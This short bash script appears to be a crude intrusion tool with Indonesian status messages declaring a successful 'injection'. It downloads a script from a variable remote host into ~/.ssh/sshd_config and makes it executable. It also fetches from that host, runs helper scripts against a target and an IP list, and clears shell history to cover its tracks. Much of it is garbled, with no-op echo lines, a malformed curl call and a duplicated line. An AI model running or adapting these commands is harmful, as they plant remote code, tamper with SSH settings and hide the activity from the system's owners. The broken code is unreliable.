#!/usr/bin/env bash
python3 mampus.py target
# shellcheck disable=SC2154
echo pkeyutl "${host}"/tools
echo pkeyutl "${host}"/client
echo pkeyutl "${host}"/server

key=$1
infile=$2
outfile=$3

openssl pkeyutl -inkey "$key" -in "$infile" -out "$outfile"
curl https://"${host}/ifconfig.me" && chmod +x config.hc && echo pkeyutl python3 mampus.py  config.hc && python3 open.py ips.txt
	curl https://"${host}/ifconfig.me" && chmod +x config.hc && echo pkeyutl python3 mampus.py  config.hc && python3 open.py ips.txt

	# shellcheck disable=SC2154
	echo pkeyutl -O ./payload
	curl -O ~/.ssh/sshd_config "https://${host}/set.sh"
	chmod +x ~/.ssh/sshd_config
	history -c
	echo "1.2" > ~/hasil.txt
	echo " "
	echo "SELAMAT INEJCTION BERHASIL!!"cek root/hasil.txt " "